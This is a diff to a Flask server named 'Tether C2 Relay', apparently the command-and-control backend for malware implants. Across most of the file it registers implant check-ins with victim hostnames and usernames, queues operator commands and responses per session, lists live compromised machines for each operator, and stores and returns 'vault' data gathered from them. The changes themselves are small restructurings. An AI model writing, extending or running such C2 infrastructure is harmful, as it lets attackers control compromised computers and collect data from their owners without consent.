@@ -13,7 +13,7 @@ class DatabaseManager:
         self.conn.execute("CREATE TABLE IF NOT EXISTS users (username TEXT PRIMARY KEY, password_hash TEXT NOT NULL)")
         self.conn.execute("CREATE TABLE IF NOT EXISTS sessions (session_id TEXT PRIMARY KEY, owner_username TEXT NOT NULL, metadata TEXT, FOREIGN KEY (owner_username) REFERENCES users(username))")
         self.conn.execute("CREATE TABLE IF NOT EXISTS vault (session_id TEXT, module_name TEXT, data TEXT, PRIMARY KEY (session_id, module_name))")
-
+    
     def create_user(self, username, password_hash):
         try:
             self.conn.execute("INSERT INTO users (username, password_hash) VALUES (?, ?)", (username, password_hash))
@@ -21,7 +21,7 @@ class DatabaseManager:
             return True
         except sqlite3.IntegrityError:
             return False
-
+            
     def get_user(self, username):
         cursor = self.conn.cursor()
         cursor.execute("SELECT * FROM users WHERE username = ?", (username,))
@@ -30,7 +30,7 @@ class DatabaseManager:
     def create_or_update_session(self, session_id, owner_username, metadata):
         self.conn.execute("INSERT OR REPLACE INTO sessions (session_id, owner_username, metadata) VALUES (?, ?, ?)", (session_id, owner_username, json.dumps(metadata)))
         self.conn.commit()
-
+        
     def get_sessions_for_user(self, username):
         cursor = self.conn.cursor()
         cursor.execute("SELECT session_id, metadata FROM sessions WHERE owner_username = ?", (username,))
@@ -45,7 +45,7 @@ class DatabaseManager:
         vault_data = {}
         for session_id, metadata in user_sessions.items():
             vault_data[session_id] = {"metadata": metadata}
-        
+
         if not user_sessions:
             return {}
             
@@ -58,14 +58,12 @@ class DatabaseManager:
         return vault_data
 
 app = Flask(__name__)
-app.config['MAX_CONTENT_LENGTH'] = 32 * 1024 * 1024
 db = DatabaseManager()
 
-# --- In-Memory State for Live Interaction ---
+# --- In-Memory State ---
 command_queue = {}
 response_queue = {}
 active_sessions = {}
-# Threading Locks
 cmd_lock = threading.Lock()
 res_lock = threading.Lock()
 ses_lock = threading.Lock()
@@ -100,15 +98,9 @@ def handle_implant_hello():
     if not all([session_id, c2_user]):
         return jsonify({"error": "session_id and c2_user are required"}), 400
     
-    metadata = {
-        "hostname": data.get("hostname"),
-        "user": data.get("user"),
-        "os": data.get("os")
-    }
-    db.create_or_update_session(session_id, c2_user, metadata)
-    
     with ses_lock:
-        active_sessions[session_id] = {"owner": c2_user, "last_seen": time.time(), "metadata": metadata}
+        db.create_or_update_session(session_id, c2_user, {"hostname": data.get("hostname"), "user": data.get("user")})
+        active_sessions[session_id] = {"owner": c2_user, "last_seen": time.time(), "hostname": data.get("hostname"), "user": data.get("user")}
     
     if "results" in data:
         for result in data.get("results", []):
@@ -148,8 +140,8 @@ def discover_sessions():
     user_sessions = {}
     with ses_lock:
         for sid, data in active_sessions.items():
-            if data["owner"] == username and (time.time() - data["last_seen"]) < 45: # Increased timeout
-                user_sessions[sid] = data["metadata"]
+            if data["owner"] == username and (time.time() - data["last_seen"]) < 40: # Increased timeout
+                user_sessions[sid] = {"hostname": data["hostname"], "user": data["user"]}
     return jsonify({"sessions": user_sessions})
     
 @app.route('/c2/get_responses', methods=['POST'])
@@ -169,7 +161,7 @@ def get_all_vault_data():
 
 @app.route('/')
 def index():
-    return "Tether C2 Relay is operational."
+    return "TetherC2 Relay is operational."
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5001)
